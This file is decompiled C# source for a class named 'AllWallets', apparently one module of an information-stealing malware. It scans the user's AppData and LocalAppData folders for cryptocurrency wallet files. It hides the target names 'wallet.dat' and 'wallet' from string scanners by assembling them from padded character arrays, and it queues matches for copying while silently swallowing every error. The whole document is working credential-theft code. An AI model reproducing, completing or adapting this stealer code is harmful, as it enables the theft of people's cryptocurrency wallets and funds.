using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000014 RID: 20
public class AllWallets : Extractor
{
	// Token: 0x0600008C RID: 140 RVA: 0x00006DA4 File Offset: 0x000051A4
	public override string Id2(Entity_FileSearchInformation scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty);
	}

	// Token: 0x0600008D RID: 141 RVA: 0x00006DF8 File Offset: 0x000051F8
	public override IEnumerable<Entity_FileSearchInformation> Id3()
	{
		List<Entity_FileSearchInformation> list = new List<Entity_FileSearchInformation>();
		try
		{
			List<string> list2 = new List<string>();
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 2, 1, new string[]
			{
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					'a',
					's',
					'f',
					't',
					'.',
					'd',
					'a',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty),
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty)
			}));
			list2.AddRange(FileCopier.FindPaths(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 2, 1, new string[]
			{
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					'a',
					's',
					'f',
					't',
					'.',
					'd',
					'a',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty),
				new string(new char[]
				{
					'w',
					'a',
					'a',
					's',
					'f',
					'l',
					'l',
					'e',
					't',
					'a',
					's',
					'f'
				}).Replace("asf", string.Empty)
			}));
			try
			{
				foreach (string fileName in list2)
				{
					string id = new FileInfo(fileName).Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty).Replace(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\", string.Empty).Split(new char[]
					{
						'\\'
					})[0];
					list.Add(new Entity_FileSearchInformation
					{
						Id5 = id,
						Id1 = new FileInfo(fileName).Directory.FullName,
						Id2 = "*wallet*",
						Id3 = false
					});
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
		return list;
	}
}
